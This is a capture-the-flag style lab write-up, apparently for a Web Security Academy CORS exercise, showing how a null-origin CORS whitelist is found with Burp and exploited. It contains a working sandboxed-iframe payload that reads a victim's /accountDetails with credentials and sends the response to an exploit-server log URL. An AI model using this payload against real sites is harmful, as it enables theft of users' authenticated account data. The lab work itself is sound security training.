We start with setting the **Target Scope** to the target domain. Then we set our browser to use Burp proxy and turn the Burp intercept **off**. After logging in with creds provided we see all the requests made in the target sitemap. Out of this one request to `/accountDetails` stands out as it contains a CORS header `Access-Control-Allow-Credentials: true`.

![image](https://user-images.githubusercontent.com/86168235/127904611-c2910c0e-3c84-466f-ad33-4024e538037f.png)


Next we add a `Origin` header to the request with a random website name and find that random requester `Origin` is blocked by CORS policy. So, next we sent the request with `Origin: null` header and we see that our request got a response with `Access-Control-Allow-Origin: null` header which means our requested `null` Origin is whitelisted by CORS policy and we can further exploit this.


## Exploitation
Same as in Lab 1 we go to the exploit server and insert out payload into the Body part. Use the following code:-

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
const xhr = new XMLHttpRequest(),
    method = 'GET',
    url = 'https://ac8d1f9f1f373e2980af24f4009a00a2.web-security-academy.net/accountDetails';
    
function handler() {
    location='https://exploit-ac781fd71f833e3280d6247b01c900e9.web-security-academy.net/log?body='+this.responseText;
    };
xhr.onload = handler;
xhr.open(method, url, true);
xhr.withCredentials = true;
xhr.send();
</script>"></iframe>
```
**Note**:- As sandboxed cross-origin requests are treated as null origin requests by browsers, the above iframe sandbox will create a null origin request for us, thus helping satisfy CORS whitelist.

---

**Next**, click on `Deliver exploit to victim` and check the `Access log` and you'll see the `/accountDetails` response body of the administrator user in our logs.

![image](https://user-images.githubusercontent.com/86168235/127904943-be8b940c-3c39-4d3b-9987-e438b41d7d14.png)
